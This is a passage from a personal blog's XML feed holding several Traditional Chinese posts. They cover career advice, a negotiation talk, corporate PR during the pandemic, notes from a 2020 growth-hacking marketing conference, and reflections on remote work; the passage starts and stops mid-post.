選工作，寧可選壓力很大但有商業思維的老闆一起工作，千萬不要找一個產業在下滑的產業，產業如果下滑就會開始因為資源不足內鬥，所以 Evonne 選擇離開產業在下滑監控產業去電商，電商的快速成長也能帶給成員成長，常常光處理外部機會就做不完了，相對比較不會去處理資源類的宮廷鬥爭。</p></li><li><p>軟體 PM 和硬體 PM 的差別，硬體要處理非常多的細節流程，換任何人做可能都沒有差異，但有機會接觸到很多業界有名的人。軟體 PM 可以快速透過迭帶對產品、對市場有影響，會比較適合想要成長變化的人。</p></li><li><p>怎麼決定要不要去做一件事或工作，看失去跟收益的比較，失去通常如果只是固定的時間，收益是沒有限制的就會去做，但像是粉絲私訊只是想要聊聊的就不一定會聊，因為主題不明確也不確定能夠幫助到什麼。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 職涯發展 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>價值談判課</title>
      <link href="/2020/12/29/career/career-value-negotiation/"/>
      <url>/2020/12/29/career/career-value-negotiation/</url>
      
        <content type="html"><![CDATA[<p>我是一個前端工程師，在當攻城獅的過程中，有發現自己被要求做違背價值觀的事情時會很沒效率也不開心，很多時候都只會悶著繼續做也不太會表達</p><p>還好在下雨天有來聽小白姐分享，在今天之前，總覺得談判好像是能言善道的人才需要學，今天聽了之後發現談判其實也是反思有沒有在<strong>交流過程中更接近目標的一種方法</strong>。</p><h2 id="價值談判"><a href="#價值談判" class="headerlink" title="價值談判"></a>價值談判</h2><p>上班族除了領錢的同時，也要發現老闆需要員工幫忙工作，找出自己對利害關係人的價值與關係，<strong>理解價值就會有談下去的自信與基礎</strong>。</p><p>其實那些被欺負很可能<strong>是我們供養出來的討厭模樣</strong>，對方一哭二鬧三上吊你妥協，下次對方就會變本加厲，因為會發現不但擅長而且這方法顯然有用。</p><p>值得思考的是比大聲、比捅刀能力、比陽奉陰違是最終的目標嗎? <strong>想輸贏的瞬間就先輸了</strong>，有時候表面上退一步，實際上會比正面對決更接近目標。</p><p>在交流的過程中有沒有誘導對方說出抓狂或傲嬌的背後原因和相關資訊? 那些<strong>以力逼人背後的 User Intent</strong> 還有那些<strong>操弄與被操弄的核心慾望</strong>，當過程和 User Intent 被拆解之後，對於那些故意的人來說，要讓他們知道這方法沒效。對於不小心表現情緒的人，我們的冷靜也是給他們宣洩的機會，事後來看也許對大家都好。</p><p>小白姐今天給大家的 CTA 是:</p><p>當發現被挑起非常態的情緒時，記得想起今天聽到的方法，可以隨身帶串念珠拿出來撥從一數到十。<br>隨時照顧一個超級正向心態的另一個自己在心裡，一發現情緒不對就出來溫馨提醒。<br>後記: 分享之前聽過的遊戲化的<strong>八角框架</strong>給大家，覺得也很適合拆解和切入對方的背後的慾望和想法。</p><h1 id="八角框架"><a href="#八角框架" class="headerlink" title="八角框架"></a>八角框架</h1><p>內、外部動機</p><ol><li>Epic Meaning: 成就感和影響力</li><li>Avoidance: 對失去的恐懼</li></ol><p>外部動機 (目標導向)</p><ol><li>Accomplishment: 發展成就，像是錢或位置</li><li>Scarcity: 競爭稀缺資源</li><li>Ownership: 所有權與佔有慾，會想要保護</li></ol><p>內部動機 (體驗導向)</p><ol><li>Empowerment: 創造與得到回饋</li><li>Unpredictability: 不確定性、好奇</li><li>Social Influence: 社會影響力與同理心 (歸屬感)</li></ol><blockquote><p>工作生活家，小白姐分享價值談判<br><img src="/2020/12/29/career/career-value-negotiation/career-value-negotiation.jpg" alt="工作生活家，小白姐分享價值談判"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 職涯發展 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>後疫情時代五種企業具備的公關力</title>
      <link href="/2020/12/06/thinking-public-relations/"/>
      <url>/2020/12/06/thinking-public-relations/</url>
      
        <content type="html"><![CDATA[<h2 id="五種企業具備的公關力"><a href="#五種企業具備的公關力" class="headerlink" title="五種企業具備的公關力"></a>五種企業具備的公關力</h2><p>2020 因為武漢肺炎的關係，全球的人類遇到了前所未有的挑戰，台灣在疫情之中很幸運的只有兩個多月左右的爆發期，但總確診人數也達到了七百大關，各行各業都有需要面臨的問題與挑戰。</p><blockquote><p>今年這波疫情下來，大家的感受是什麼? 感覺開心、生氣、難過或是沮喪?</p></blockquote><p>對企業來說，公關需要在這個艱困的時候做出影響力，讓大家明白企業的價值，讓大家能說出有這個企業真好。回到我們個人身上可以思考的是平常該怎麼經營形象? 這篇文章小編就會分享參加了兩場講座聽到的相關心得筆記，讓我們看下去。</p><h3 id="簡秀芬-艾瑪絲海外行銷副總-要活出自己的一道光"><a href="#簡秀芬-艾瑪絲海外行銷副總-要活出自己的一道光" class="headerlink" title="簡秀芬 | 艾瑪絲海外行銷副總 | 要活出自己的一道光"></a>簡秀芬 | 艾瑪絲海外行銷副總 | 要活出自己的一道光</h3><p>艾瑪絲在今年通過了 B 型企業認證，B 型企業的 B 是 Benefit 的意思，會依照公司治理、員工照顧、環境友善、社區照顧和客戶影響力等五大面對企業做評估。</p><p>當企業通過認證後，發生了一件有趣的事情，企業開始關注在某種議題後，就會有某種吸引力。</p><ul><li>合作對象: 對客戶來說 B 型企業加上搖籃到搖籃認證，有認同感</li><li>員工: 吸引好人才</li><li>品牌形象: Now and Never 現在就是時候，品牌的影響力開始擴大</li></ul><h3 id="林耀民-Klook-台灣資深市場行銷總監-把消費者放第一"><a href="#林耀民-Klook-台灣資深市場行銷總監-把消費者放第一" class="headerlink" title="林耀民 | Klook 台灣資深市場行銷總監 | 把消費者放第一"></a>林耀民 | Klook 台灣資深市場行銷總監 | 把消費者放第一</h3><p>公關處理，Klook 在疫情剛開始</p><ul><li>針對特定國家商品無條件退費</li><li>第一線防疫和醫療人員退費</li><li>供應商的費用處理</li></ul><p>環球影城退票，其實購買票券後一般是不接受退票，但 Klook 做了無條件協助退票的決定。<br>PTT 的日旅版: <a href="https://ptttravelfood.com/japan_travel/M.1582018753.A.467.html">https://ptttravelfood.com/japan_travel/M.1582018753.A.467.html</a></p><p>旅遊業在國外嚴重被影響時，Klook 在選擇</p><ul><li>三月跟台南簽合作備忘錄，台南竹筏考蚵 暑假時間第八名</li><li>五月簽屏東</li><li>餐廳的合作: 到店取餐是為了讓消費者認識店面</li><li>文化部地方創生小旅行</li></ul><p>即便國際疫情嚴重，商品的預定數成長了 1.5 倍，管理上對內採放任式的管理，只要不違反善良風俗的事情都可以去做，社群操作上員工越玩越負責，員工自主跟風換了兩次，都有不錯的效果。</p><ul><li>粉紅口罩</li><li>保持社交距離</li></ul><h3 id="謝馨慧-台灣奧美董事總經理-數位化本身是假議題"><a href="#謝馨慧-台灣奧美董事總經理-數位化本身是假議題" class="headerlink" title="謝馨慧 | 台灣奧美董事總經理 | 數位化本身是假議題"></a>謝馨慧 | 台灣奧美董事總經理 | 數位化本身是假議題</h3><p>想要活著就要數位化，數位化本身是假議題，年輕一代從小就活在數位化的世界裡，只有老人才需要數位轉型，今年對業界來說普遍都很辛苦，要思考的是品牌存在在這個世界上的意義是什麼。</p><p>對公關公司來說雖然實體客戶被影響，但遊戲、電商、宅經濟的成長讓公司能處在沒有虧損的狀態，對各企業來說縮短產品跟消費者的距離都是需要努力的目標，公關能做的就是把最好的表現完整的告訴大家。</p><h3 id="蘇小真-家樂福文教基金會執行長-最壞的時代也是最好的時代"><a href="#蘇小真-家樂福文教基金會執行長-最壞的時代也是最好的時代" class="headerlink" title="蘇小真 | 家樂福文教基金會執行長 | 最壞的時代也是最好的時代"></a>蘇小真 | 家樂福文教基金會執行長 | 最壞的時代也是最好的時代</h3><p>零售產業的家樂福在前三季的業績是逆勢成長的，即使國外供應可能中斷，卻充分發揮了長期與在地連結的優勢，讓小農商品在這波疫情中可以被更多人看到。今年這波疫情下來，大家的感受是什麼? 感覺生氣、難過、沮喪?</p><p>對台灣來說，小真執行長認為是值得開心的一年，因為是第一次看到全台灣人不分政黨、種族、性別、年齡這麼團結一起對抗疫情，台灣今年在世界打出的品牌，是過去花幾百億都無法做到的，台灣的疫情很幸運在兩個月左右就成功控制。</p><p>在這波疫情之下，大家往往只看到賣場好的一面，新聞上常常看到一群人進去把架上東西買完，在這波過程中從米、罐頭的產量才發現原來當內需增加的時候，主流廠商目前的生產量是不足夠提供目前的需求的。</p><p>台灣屬於海島國家，理性上來看魚罐頭應該是完全不缺乏，但因為人口下降、工廠環境較落後、罐頭廠沒有全天生產，漁獲甚至是出口後加工才回國內，從小到大罐頭品牌有什麼驚為天人的改變嗎?也許大家常常說倒了很多店家，但倒閉也許不是因為疫情影響，疫情可能只是最後一根稻草，當風險提高的時候，消費者只會花錢在最想花錢的地方，而那些可有可無的選擇，</p><p>未來人口是會一直下降的，但消費我們要看的是台灣的關係人口，舉日本的例子，大家會為了買日產的電器、名產、動畫產品而特別到日本一趟，台灣則是選擇把最高級的東西出口，一盒鳳梨酥出口能賺多少錢? 如果我們能夠把鳳梨酥留在台灣，帶起來的價值會是難以衡量的。</p><p>家樂福 CSR 的目標在希望讓大家看見台灣本來看不見的，希望透過這樣的方式倡導食物相關的議題，像是非籠飼雞蛋、御鼎興純手工柴燒黑豆醬油、禾乃川豆漿，希望從土地的角度、台灣整體的角度達到共好。</p><p>共好，為什麼很重要? 只看競爭對手就會一直對打，整個環境並不會一起變好，要看的應該是跟土地的關係，所以選擇從碳排放、有機等公共利益的角度來推廣社會責任的商品。</p><h3 id="丁菱娟-世紀奧美創辦人-影響有影響力的人"><a href="#丁菱娟-世紀奧美創辦人-影響有影響力的人" class="headerlink" title="丁菱娟 | 世紀奧美創辦人 | 影響有影響力的人"></a>丁菱娟 | 世紀奧美創辦人 | 影響有影響力的人</h3><p>PESO 模型，用媒體分類來看</p><ul><li>廣告: Pay Media</li><li>公關: Earn Media</li><li>社群: Shared Media</li><li>自媒體: Own Media</li></ul><p>即便擁有多年職場資歷，我們能發揮多少影響力？</p><ul><li>公關是一門溝通的藝術</li><li>公關的本質是誠信，實話可以不要全說，謊話不能說</li><li>公關是影響有影響力的人，某些部分是在處理利益關係人 （stakeholders）</li><li>公關操作上是讓別人說你好，廣告行銷則是自己說自己很好，對媒體來說</li></ul><p>價值與價格存在的空間來自情感的差異，品牌要給人想像的空間，如果 Nike 只是在衣服上印一個勾，其實並不應該發生這麼大的價差，品質好是基本，重要的是想到你在情感上落差有多少，Nike 只贊助優秀的球員，因為優秀的背後是自律的鍛鍊還有對挑戰的不斷突破，口號 Just do it 背後的其實是運動家的精神，所以一件打勾的白色 T-shirt 可以多幾倍的價錢。</p><p>人生中最重要的三個利益關係人，處理好這樣的關係，人生的品質可能會好很多，我們要做什麼維護關係?生活和工作的平衡，其實重要的是有更喜歡的事情，人生一輩子，真正有價值的就只有時間，給的時間就要把其他的事情排除</p><blockquote><p>小編本人很喜歡的一句話:「浪費別人的時間等於謀財害命，浪費自己的時間等於慢性自殺。」</p></blockquote><p>對當事人有利對他人有利，利他才會讓 KOL 幫你宣傳，雙贏的一個思維，他幫你宣傳也增加他的形象，當年 who’s call 因為 App 本身的功能讓 Android 平台有了創新的功能，於是得到 google 執行長的宣傳，讓這一家台灣的小公司瞬間爆紅。</p><p>長榮航空當年金城武的廣告，並沒有在做航空公司本質的介紹，而是透過拓展眼界的這種價值觀來操作，成功了營造了企業形象，也捧紅了那棵樹。廣告，在意的是真實、有趣好看，強調的是後續的互動、分享，值得思考的事情是行銷會不會變成推銷? 那差別在哪?</p><ul><li>業務，重要的是拿到單，吃的是執行力</li><li>行銷，重要的是本質，讓使用者會想要和好奇，吃的是創造力</li></ul><h2 id="如何經營自身的公關力"><a href="#如何經營自身的公關力" class="headerlink" title="如何經營自身的公關力"></a>如何經營自身的公關力</h2><p>日常生活其實是想法跟實作的綜合體，每天有什麼樣的想法，就決定怎麼過一天，怎麼過一天，我們就怎麼過一輩子，而這樣的價值觀也會外顯在我們的行為上，我認為當行為和想法一致時就會對散發出來的形象產生影響。</p><p>當我們言行一致，活出屬於自己的一道光，做自己擅長的事情，譬如法師就好好助攻、力量英雄就好好坦血、敏捷英雄負責補刀，貢獻最好的攻擊輸出給團隊或社會。</p><p>把人生中最重要的三個利益關係人放第一，從共好的角度出發，讓整個系統一起變好，只有環境好了個體才會好，談到環境在這邊真的很感謝齊柏林導演，讓我們看見台灣的美麗與哀愁，最近的逐岸特展真的非常棒，推薦給大家。</p><blockquote><p><a href="https://www.chipolin.org/foundation/space2.php">https://www.chipolin.org/foundation/space2.php</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 產業觀察 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 個人成長 </tag>
            
            <tag> 產業觀察 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 成長駭客年會</title>
      <link href="/2020/12/03/experience-sharing-growth-hacker-seminar-2020/"/>
      <url>/2020/12/03/experience-sharing-growth-hacker-seminar-2020/</url>
      
        <content type="html"><![CDATA[<p>Growth Hacking 就字面上的意思來說是透過非主流的方式去增加額外的成長，一個經典的案例像是 iPhone 在寄信的時候補上 Sent From My iPhone。</p><p>短短六年的職涯待過內部新創、新創、中小企業、上市櫃公司，覺得敏捷、成長駭客的概念如果把一些專業術語拿掉後不僅適用於企業也很適合放在成長與生活最佳化。</p><blockquote><p>運用當下有限的資源，用自己擅長的方法不斷成長</p></blockquote><p>這篇文章會分享小編在 2020 成長駭客年會聽到行銷在 GDPR 與肺炎疫情後的行銷轉型與想法。</p><h2 id="現況與問題"><a href="#現況與問題" class="headerlink" title="現況與問題"></a>現況與問題</h2><p>GDPR 與武漢肺炎後的影響</p><ul><li>第三方 cookie 沒辦法使用</li><li>2020 WWDC 後 IDFA 政策改變</li><li>各行業被強迫數位轉型</li></ul><p>需要被解決的問題，同個使用者</p><ul><li>擁有多個數位身分</li><li>跨平台追蹤同個使用者</li><li>同個裝置被家庭共用</li></ul><p>目前的解決方法</p><ul><li>透過行銷，讓使用者把實體帳號跟社群帳號綁定，綁定時進行清洗</li><li>沛星互動</li><li>以產品為基礎的推薦系統</li></ul><h3 id="破碎化時代"><a href="#破碎化時代" class="headerlink" title="破碎化時代"></a>破碎化時代</h3><blockquote><p>AWOO CEO | 林思吾 | Cookieless 的時代，基於對產品的了解來做推薦</p></blockquote><p>電商、社群快速發展造成消費者旅程破碎，透過搜尋、FB、Line、IG、直播都能夠找到商品並購買:</p><ul><li>2016 FB、Line、IG 各種社群快速發展，店家起飛</li><li>2017 後 Facebook 時代，演算法改變，透過自帶流量回應演算法改變<ul><li>Contenet Marketing</li><li>Email 行銷</li></ul></li><li>2018 GDPR，DMP (Data Management Platform) + CRM 經營流量池，善用工具與數據測試</li><li>2019 體驗行銷 DMP to CDP (Customer Data Platform)</li><li>2020 武漢肺炎強迫數位轉型，典範轉移<ul><li>Podcast</li><li>直播購物: 一個月十億 GMV “高客單價賣一個寂寞的生意”</li><li>OMO 成長 (Online merge Offline || offline merge Online)</li></ul></li></ul><p>破碎意味行銷要經營多管道、學習行銷自動化的科技，內部人才需能夠撰寫腳本和操作相關工具，面對 Cookieless 的時代，從了解個人轉換到基於行為和產品的推薦。</p><p>以搜尋五星級飯店的行為背後的隱性需求可能會有</p><ul><li>兒童遊戲室</li><li>大陽台吸菸</li><li>SPA 網美照</li></ul><blockquote><p>怎麼把站外的搜尋意圖對應到到站內的分類或頁面?</p></blockquote><p>從了解個人轉換到基於行為和產品的推薦，可以透過 AI 分析行為和商品的特徵來了解消費著意圖和背後的隱性需求</p><ol><li>商品貼特徵標籤</li><li>消費者行為貼上標籤</li><li>把標籤與標籤之間建立連結</li></ol><h2 id="後疫情的娛樂觀察"><a href="#後疫情的娛樂觀察" class="headerlink" title="後疫情的娛樂觀察"></a>後疫情的娛樂觀察</h2><h3 id="波痞-網路工作者-在不同社群平台上的轉換"><a href="#波痞-網路工作者-在不同社群平台上的轉換" class="headerlink" title="波痞 | 網路工作者 | 在不同社群平台上的轉換"></a>波痞 | 網路工作者 | 在不同社群平台上的轉換</h3><p>追蹤者在不同平台上的轉換，即使是追蹤同個 KOL 在不同平台上的行為也是各有不同，各個時期網路工作者的嘗試</p><ul><li>初期，只要有新平台就嘗試，無名小站、批踢踢、噗浪、Facebook</li><li>中期，App 的興起，中小型平台暴增，但大多數都會自然淘汰</li><li>後期，大型平台更大，Facebook 同溫層化嚴重 (長期下來只會看到喜歡的)</li></ul><p>平台的特質</p><ul><li>YouTuber: 平台黏著度高，對錯誤瑕疵接受度低、對特定議題包容度低</li><li>Facebook: 性別分布集中、同溫層性質高、個人帳號觸及率佳、社團觸及率居中</li><li>Instergram: 年齡集中某個年紀以下，部分使用者不使用 Facebook，跟使用者更親近 (FB 需要透過後台)</li></ul><p>怎麼進行合作</p><ul><li>需求禁忌事先溝通 (品牌大小寫、字詞用法)</li><li>不需要小事就常常見面談</li><li>設定彼此回覆的最晚期限</li><li>尊重 KOL 的追蹤者愛好</li></ul><h3 id="YouTube-夥伴經理-戴文琪-Creators-Connect-將內容、數據、媒體廣告整合"><a href="#YouTube-夥伴經理-戴文琪-Creators-Connect-將內容、數據、媒體廣告整合" class="headerlink" title="YouTube 夥伴經理 | 戴文琪 | Creators Connect 將內容、數據、媒體廣告整合"></a>YouTube 夥伴經理 | 戴文琪 | Creators Connect 將內容、數據、媒體廣告整合</h3><p>內容與流量策略</p><ul><li>65% 的人認為 YouTube 感覺像是真實人生</li><li>疫情之下因為居家所以 YouTube 使用上升<ul><li>Home School、Home Workout、Home Learning</li><li>成長: 遊戲 12 倍、娛樂 3 倍、生活 3 倍、知識 2 倍</li></ul></li></ul><p>消費者決策</p><ul><li>81% 認為 YouTube 影響購買決策</li><li>75% 使用者認為品牌應該主動傳遞努力的訊息</li><li>73% 會和其他人一起看影片</li></ul><p>內容策略，經營一個好的品牌，需要進行持續的溝通，影音的組成</p><ul><li>Hero Content: 大家想到你，最強的是什麼? 吸引使用者讓不認識品牌的人 mass user 認識</li><li>Help Content: How to、Targeted topics 目標是 converts casuals</li><li>Hub Content: Common 的內容，像是桃貴的每日影片，讓用戶感到熟悉並在固定時間回來</li></ul><p>Creators Connect 的經典案例，易遊網透過 Hello Kitty 包裝，將內容、數據、媒體廣告整合，改善早期 YouTube 大多只是 branding 和導流的功能</p><ul><li>發現環島與旅遊搜尋熱度提高</li><li>分析到底誰是真的 TA﹐</li><li>透過受歡迎跟上傳數來做 X, Y 軸的分析</li></ul><p>高觀看但低上傳 (第二象限) 的就是機會點，透過林宣花蓮旅遊影片中置入，讓創作者在影片中直接置入相關廣告，透過數據、內容、廣告直接的整合達到更好的成效。</p><ul><li>觀看率 3.6 倍 (超過平均)</li><li>點擊率 6 倍</li><li>94% 用戶新成長</li></ul><p>Key Takeaway</p><ul><li>Be Personal 品牌形象能夠個人化，像是好朋友一樣透過平台溝通</li><li>Be Commuicative 持續的溝通</li><li>Be Holistic 數據、內容、廣告直接的整合</li></ul><h3 id="凱絡媒體商務長-陳顯立-人才佈局上用多元的經驗來應對行銷破碎化的時代"><a href="#凱絡媒體商務長-陳顯立-人才佈局上用多元的經驗來應對行銷破碎化的時代" class="headerlink" title="凱絡媒體商務長 | 陳顯立 | 人才佈局上用多元的經驗來應對行銷破碎化的時代"></a>凱絡媒體商務長 | 陳顯立 | 人才佈局上用多元的經驗來應對行銷破碎化的時代</h3><p>商業轉型的問題在哪? 思維 -&gt; 行動 -&gt; 結果</p><ul><li>太容易得到加工過的轉化知識，但並不完全能轉移到我們身上，如何解決?<ul><li>同樣聽到大象想像的並不同 (非洲象、小飛象)，轉化後的不同源自多元的生活經驗</li><li>消費者的破碎化也是來自多元經驗，如果一個人沒辦法解決，就靠團隊的多元經驗解決</li></ul></li><li>知識轉成行動要花多少時間風險?</li><li>業績成長中怎麼擁有病識感?<ul><li>駕訓班學會開車，短時間的成長，但我們真的會這樣開車嗎?</li></ul></li><li>從技能到能力就能夠成功?<ul><li>天天騎 Ubike 上班就能變成飆速宅男?</li></ul></li></ul><p>轉型的過程中要等待的事情是</p><ul><li>科技的選擇: 選擇適合的，如果同事都只會 csv 那就用 csv</li><li>效果的遞延性，吃饅頭假設吃到第四顆才會飽，客戶常常只想知道怎麼樣會飽</li><li>時機的偶然性，武漢肺炎導致遠端相關股票大漲</li></ul><p>人才聘用與選擇上</p><ul><li>知識技術 (操作後台)、概念結構 (決策的邏輯)、時間金錢 (待多久)</li><li>IT 腦 (有邏輯) + 企劃心 (有想像願景、看見未來) + 業務身 (嘗試)</li></ul><h3 id="全家-E-Retail-王啟丞-專為團媽設計的平台"><a href="#全家-E-Retail-王啟丞-專為團媽設計的平台" class="headerlink" title="全家 E-Retail | 王啟丞 | 專為團媽設計的平台"></a>全家 E-Retail | 王啟丞 | 專為團媽設計的平台</h3><p>集中式電商平台 -&gt; 發散式社群電商，武漢肺炎今年推動數位轉型，蝦皮改變了 C2C 的生態，那難道全家只能做物流嗎?</p><p>好賣+ 是為賣家做的平台，團媽、兼職賣家挑買家圈出自己的顧客，自帶流量</p><ul><li>未取件由平台吸收</li><li>只有買家取貨率</li><li>超過 9 成使用手機，所以為了賣家設計 APP 版本</li><li>20 萬賣家</li><li>80% 來自臉書社團</li><li>25~44 歲女性居多</li><li>母嬰&#x2F;玩具&#x2F;3C&#x2F;服飾&#x2F;日用</li></ul><blockquote><p>阿榮嚴選 | 陳昭榮 | PK 演算法，做好短影音再做直播</p></blockquote><p>短影音最佳化流程</p><ul><li>定位</li><li>3 秒演算法</li><li>8 秒完播率</li><li>引流</li></ul><p>賣生鮮的影音規劃</p><table><thead><tr><th>生的鯖魚</th><th>熟的鯖魚</th></tr></thead><tbody><tr><td>標籤: 鯖魚、魚、營養</td><td>標籤: 煎、魚、烤、鯖魚</td></tr><tr><td>預測心態: 生的、油煙要煮、魚腥味、麻煩</td><td>預測心態: 燒烤味、香酥、配啤酒、好吃</td></tr></tbody></table><p>2016 影音推播關鍵，標籤權重演算法</p><ul><li>時間點: 晚上十點播短影音，煎牛排的影片</li><li>關鍵字: 2016 櫻桃直播的權重變高，一小時賣了 300 萬的櫻桃</li><li>ID (人): 個人看了什麼對什麼有興趣</li><li>場景 (變數): 在什麼情況下看，像是氣溫、節慶</li></ul><h3 id="91APP-將消費者變為-OMO-消費者後對營收的影響"><a href="#91APP-將消費者變為-OMO-消費者後對營收的影響" class="headerlink" title="91APP | 將消費者變為 OMO 消費者後對營收的影響"></a>91APP | 將消費者變為 OMO 消費者後對營收的影響</h3><p>91APP 主要是零售業，客戶買系統是為了買一個可以賺錢的系統，OMO 的關鍵是 App</p><ul><li>Web 流量大於 App: 官網適合放廣告吸引新客人，開創新業績</li><li>App 購買轉換率大於 Web: 用 App 收集熟客，留住老客人</li></ul><p>九成消費者都是透過手機買東西，所以商品詳細頁最好做成直版的。邏輯上會留著 App 代表會用來買東西，我們也發現品牌越有名 App 的使用率越高，所以透過在門市推廣下載 App，之後用 App 推播門市活動做到整合。</p><blockquote><p>Q: 消費者口袋深度一樣，將消費者推到線上，門市業績是否會下降?<br>A: 整體業績其實是向上提升的</p></blockquote><p>OMO 的消費者歷程，下載 App 後，增加了消費者看到商品的機率，雖然消費者仍然到門市購買，但明顯增加了實體購買次數，2020 疫情關係，讓 App 的消費成長，真的進到 OMO 的循環。</p><ul><li>在門市看過之後到線上買</li><li>在線上看過之後到門市買</li></ul><p>把使用者分群</p><ol><li><p>單一通路購買</p><ul><li>只在門市購物，有下載 App<ul><li>有使用 App</li><li>沒使用 App (用完優惠券就刪掉)</li></ul></li><li>只在門市購物，但沒有下載 App</li><li>只在線上購買</li></ul></li><li><p>OMO 雙通路購買，貢獻度會最高，某間店家的數據 5% 消費者貢獻 20% 的業績</p></li><li><p>未購買</p></li></ol><p>其實除了 App 透過 Line 也可以做到 OMO，有時候其實是在處理公司的組織轉型，像是政治面因為公司 KPI 的關係，要讓門市人員願意去推廣就要把業績算給門市人員，當消費者在實體店面結帳前，透過店員用折扣推廣在線上結帳，並且給店員相關業績獎金，只要把消費者推向 OMO 那點獎金算是很值得的投資。</p><blockquote><p>問題: 消費者旅程破碎，對行銷來說要怎麼歸因 OMO 的成效?</p></blockquote><ul><li>透過事件追蹤</li><li>透過行銷活動整合會員，技術上要能夠洗乾淨會員資料<ul><li>一個電話可以辦三張卡</li><li>一張卡多人使用</li></ul></li></ul><h2 id="職涯發展與觀察"><a href="#職涯發展與觀察" class="headerlink" title="職涯發展與觀察"></a>職涯發展與觀察</h2><p>從增量的概念來看職涯，你的主管就是這份工作職涯的發展上限，所以如果你的主管只是第一階的主管?</p><ul><li>可以把他當職涯上的顧問</li><li>戰場很大可以不用把目標放在這間公司</li></ul><p>下弦之壹魘夢在鬼滅中曾說到</p><blockquote><p>人類的原動力是心靈、精神，因為人類的心全都一樣，就像玻璃工藝品一般地脆弱啊。</p></blockquote><p>其實鬼也是一樣，當下弦或是普通的鬼被打敗的時候，卻只會懷疑怎麼得到無慘大人的血怎麼還是輸了? 因為所有的鬼其實都是無慘的流量池，都是韭菜 🙃🙃🙃</p>]]></content>
      
      
      <categories>
          
          <category> 數位行銷 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 數位行銷 </tag>
            
            <tag> 產業觀察 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>從辦公室到遠端，四個價值觀的轉換與改變</title>
      <link href="/2020/11/26/career-remote-work-values/"/>
      <url>/2020/11/26/career-remote-work-values/</url>
      
        <content type="html"><![CDATA[<h2 id="從辦公室到遠端，四個價值觀的轉換與改變"><a href="#從辦公室到遠端，四個價值觀的轉換與改變" class="headerlink" title="從辦公室到遠端，四個價值觀的轉換與改變"></a>從辦公室到遠端，四個價值觀的轉換與改變</h2><p>前篇文章提到高中同學屁蒼<a href="https://linyencheng.github.io/2020/11/17/career-remote-work-interview/">怎麼做到同時服務三家公司</a>，<a href="https://linyencheng.github.io/2020/11/25/career-remote-work-life/">同時執行三份工作的真實樣貌</a>，這篇文章會聊聊從辦公室到遠端，那些價值觀的轉換與改變。</p><h3 id="心態轉變"><a href="#心態轉變" class="headerlink" title="心態轉變"></a>心態轉變</h3><p>同時服務三間公司後，會要常常估算時間還有排進度，感覺有時比主管還在意進度，基本上不會有不知道要做什麼的時候，比較多是接下來要做哪個，會比較常跟老闆或主管對談，同事們也會覺得這人很奇特。</p><p>當大家提到是員工，一般會覺得是上下關係。全遠端兼職後，H 覺得變得比較像是合作關係，會比較像是把老闆當成顧客，只是花錢買產出，可能因為少了競爭敵對關係，跟同事們的對話也會比較輕鬆有趣一些。</p><p>另外比較明顯的感受是，開始遠端工作後，過去的老闆、主管講話開始也比較客氣。</p><h3 id="關於離職的想法"><a href="#關於離職的想法" class="headerlink" title="關於離職的想法"></a>關於離職的想法</h3><p>H 這幾年下來換過了一些公司跟產業，雖然目前還沒辦法驗證，但目前所見所得的感想是沒有完美的公司、工作，舉個例子來說: 台積電跟 Google 也會有人離職。</p><p>工作不爽，一般就有離職的想法。對 H 來說比較像是 1 或 0 就職或離職，難道有不離開公司又爽的方法? 其實除了 1 或 0 外，退一步想還有 0.8、0.5、0.4，這時候有沒有覺得路變寬了? 也就是變成減薪兼職之類的，各退一步。離職對公司來說其實蠻傷的，一些技術的養成也不容易，雙方各退一步，公司留住技術，人也可以休息或是再找一份工作。</p><h3 id="對於加班的看法"><a href="#對於加班的看法" class="headerlink" title="對於加班的看法"></a>對於加班的看法</h3><p>工作只是一種框架，一種定義。</p><p>撇開這層框架，其實對 H 來說無論在公司寫專案，或是下班後寫自己的專案，其實都是程式碼。</p><p>在剛開始上班時，會想說六點下班後不寫工作的程式碼，寫自己的，才不會吃虧。晚上開創自己的 side project。但因為下班時間有限，能寫的時間其實也不多，進步有限，公司的程式又僅侷限於上班時間思考，有時候額外的自主學習其實也很重要，結果在工作上也是進步有限。</p><blockquote><p>通常很累，且兩邊都弄不好。</p></blockquote><p>現在的看法是，就算假日或晚上弄公司的東西也沒關係，都是程式碼，沒有需要特別區分，寫了都是進步。只要每周的量不要超過我能負荷的，我是沒有晚上或假日加班的概念的。填加班單也麻煩，其實是怕麻煩?</p><p>突然想到一本書，不知道大家有沒有看過，<a href="https://www.csie.ntu.edu.tw/~p92005/Joel/x.html">“約爾談軟體”</a>，H 推薦大家可以去看看。</p><h3 id="反思開會的意義"><a href="#反思開會的意義" class="headerlink" title="反思開會的意義"></a>反思開會的意義</h3><p>H 思考本源問題比較重要，其他其實都是看個人如何實作。許多我覺得厲害的人，真的仔細觀察他們的話，會發現他們都是針對問題的核心提出疑問，他們出書的話，也就是他們探詢答案的過程。</p><p>什麼是本源問題? 像是什麼是工作? 為什麼要工作? 錢是什麼? 為什麼我這麼累? 生命是什麼? 我存在的意義? 這些看似很基礎的東西若無法理解，一切建立在其上的也都只是虛幻，簡單來說就是瞎忙一通。</p><p>當然看看別人的想法參考參考也是不錯。每個人在不同人生階段會找到適合自己的答案。</p><h2 id="小編心得分享"><a href="#小編心得分享" class="headerlink" title="小編心得分享"></a>小編心得分享</h2><p>技術上來說，工作真的會有其他更好的樣貌，畢竟公司內部也常常很多無效會議、加班、PMP 符合上意的報告，對知識工作者來說，尤其像程式撰寫，隨著熟練程度的增加，搭配相關工具的輔助，是可以有效減少工時又同時增加產出的。</p><p>另外我自己也蠻推薦 104 跟 LinkedIn 的履歷常常更新，也可以藉此回顧這段時間到底做的事情對生涯到底有沒有價值，二方面，我認為只要不是自己開的公司就是打工，有更好的成長機會就應該馬上過去，我覺得 H 